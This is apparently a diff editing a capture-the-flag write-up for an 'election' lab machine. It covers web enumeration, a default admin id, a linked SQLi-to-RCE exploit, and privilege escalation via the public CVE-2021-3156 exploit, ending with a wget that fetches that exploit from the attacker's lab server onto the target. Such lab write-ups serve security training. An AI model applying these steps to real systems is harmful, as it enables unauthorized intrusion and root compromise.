@@ -93,25 +93,17 @@ All of these return a 404 accept for the election directory!
 
 ![image.png](image%206.png)
 
-This is some kind of election website and after some research I found this page on it
+This is some kind of election website and after some research I found this page on it [Here](https://sourceforge.net/projects/election-by-tripath/), as well as the creator’s page [Here](https://fauzantrif.wordpress.com/2019/10/16/election-update-releases/).
 
-https://sourceforge.net/projects/election-by-tripath/
-
-As well as the creator’s page
-
-https://fauzantrif.wordpress.com/2019/10/16/election-update-releases/
-
-This shows us the versions and what files are updated for each version which is very useful! It allows us to find out which version we have. After some research, the 2.0 version of eLection has a SQLi-To-RCE vulnerability that we can abuse if we have the admin credentials!
-
- https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md
+This shows us the versions and what files are updated for each version which is very useful! It allows us to find out which version we have. After some research, the 2.0 version of eLection has a [SQLi-To-RCE vulnerability](https://github.com/J3rryBl4nks/eLection-TriPath-/blob/master/SQLiIntoRCE.md) that we can abuse if we have the admin credentials!
 
 However, after looking at these changelogs by the creator:
 
 ![image.png](image%207.png)
 
-I tested to see if we had these files, and sure enough we do which means ours is the patched `2.1` verson :(
+And testing to see if we have these files, sure enough we do which means ours is the patched `2.1` verson :(
 
-But we do find the admin login page! And we can find some others with gobuster too.
+But we do find the `/admin` login page! And we can find some others with gobuster too.
 
 ![image.png](image%208.png)
 
@@ -147,9 +139,7 @@ Finished
 ===============================================================
 ```
 
-I was able to find default admin id of `1234` here:
-
-https://sourceforge.net/p/election-by-tripath/wiki/Documentation%20-%20Installer%20Guide/
+I was able to find default admin id of `1234` [here](https://sourceforge.net/p/election-by-tripath/wiki/Documentation%20-%20Installer%20Guide/).
 
 The id worked and the login prompt showed us it belonged to the admin user `love` but the password was different than the default. I hit a roadblock here UNTIL I ended up running gobuster ONCE AGAIN but on our admin directory.
 
@@ -301,9 +291,9 @@ This is an old version possibly vulnerable to CVE-2021-3156, Sudo Baron Samedit.
 
 [https://github.com/worawit/CVE-2021-3156](https://github.com/worawit/CVE-2021-3156)
 
-https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py
+And went ahead and picked [This Once](https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py).
 
-I transferred it with our python webserver and fingers crossed!
+I then transferred it with our python webserver and fingers crossed!
 
 ```
 love@election:/tmp$ wget 192.168.45.198:8000/exploit_nss.py
